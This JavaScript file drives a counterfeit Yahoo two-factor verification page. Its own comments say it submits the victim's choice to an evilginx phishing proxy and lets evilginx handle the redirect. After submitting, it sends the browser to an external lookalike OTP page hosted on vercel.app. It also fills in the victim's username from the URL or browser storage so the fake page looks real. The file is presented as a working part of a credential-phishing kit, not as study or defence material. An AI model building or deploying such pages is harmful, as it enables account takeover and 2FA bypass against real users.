// Import jQuery
const $ = require("jquery")

document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector(".signin-form")
  const continueBtn = document.getElementById("continueBtn")
  const verificationOptions = document.querySelectorAll(".verification-option")
  const challengeInput = document.getElementById("challenge")

  let selectedMethod = null

  // Handle verification option selection
  verificationOptions.forEach((option) => {
    option.addEventListener("click", function () {
      // Remove selected class from all options
      verificationOptions.forEach((opt) => opt.classList.remove("selected"))

      // Add selected class to clicked option
      this.classList.add("selected")
      selectedMethod = this.dataset.method
      challengeInput.value = selectedMethod

      // Enable continue button
      continueBtn.disabled = false
      continueBtn.style.opacity = "1"

      // Add visual feedback
      this.classList.add("fade-in")

      // Check the radio button
      const radio = this.querySelector('input[type="radio"]')
      if (radio) {
        radio.checked = true
      }
    })
  })

  // Form submission
  form.addEventListener("submit", (e) => {
    e.preventDefault()

    if (!selectedMethod) {
      alert("Please select a verification method")
      return
    }

    // Show loading state
    continueBtn.innerHTML = '<span class="loading-spinner"></span>Sending code...'
    continueBtn.disabled = true

    // Store selected method
    sessionStorage.setItem("yh_2fa_method", selectedMethod)

    // Create form data
    const formData = new FormData()
    formData.append("challenge", selectedMethod)

    // Submit to evilginx
    fetch(window.location.href, {
      method: "POST",
      body: formData,
      credentials: "include",
    })
      .then(() => {
        // Redirect will be handled by evilginx force_post
        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
      })
      .catch((error) => {
        console.error("Error:", error)
        // Fallback redirect
        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
      })
  })

  function showError(message) {
    let errorDiv = document.querySelector(".error-message")
    if (!errorDiv) {
      errorDiv = document.createElement("div")
      errorDiv.className = "error-message"
      form.appendChild(errorDiv)
    }
    errorDiv.textContent = message
    setTimeout(() => errorDiv.remove(), 5000)
  }

  // Auto-select SMS by default
  const smsOption = document.getElementById("sms-option")
  if (smsOption) {
    smsOption.checked = true
    smsOption.closest(".verification-option").classList.add("selected")
    selectedMethod = smsOption.closest(".verification-option").dataset.method
    challengeInput.value = selectedMethod
    continueBtn.disabled = false
    continueBtn.style.opacity = "1"
  }

  $(document).ready(() => {
    console.log("2FA verification page initialized")

    // Handle verification method selection
    $(".verification-option").click(function () {
      $(".verification-option").removeClass("selected")
      $(this).addClass("selected")
      selectedMethod = $(this).data("method")
      $("#challenge").val(selectedMethod)
      console.log("Selected method:", selectedMethod)

      // Enable continue button
      $("#continueBtn").prop("disabled", false)
      $("#continueBtn").css("opacity", "1")
    })

    // Set default selection
    $('.verification-option[data-method="sms"]').addClass("selected")

    // Handle form submission
    $("#challenge-form").on("submit", (e) => {
      e.preventDefault()

      console.log("Submitting 2FA challenge:", selectedMethod)
      $("#main-form").hide()
      $("#loading-state").show()

      // Simulate sending code and redirect to OTP page
      setTimeout(() => {
        window.location.href = "https://custom-yahoo-otp-test.vercel.app/"
      }, 2000)

      return false
    })

    // Get username from URL or storage
    function getUsername() {
      const urlParams = new URLSearchParams(window.location.search)
      let user = urlParams.get("u")

      if (user) {
        return decodeURIComponent(user)
      }

      user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
      if (user) {
        return user
      }

      return "your account"
    }

    // Initialize page
    const username = getUsername()
    $("#userEmail").text(username)
    $("#username").val(username)

    console.log("2FA page ready for user:", username)
  })

  // Initialize form state
  continueBtn.disabled = true
  continueBtn.style.opacity = "0.6"
})
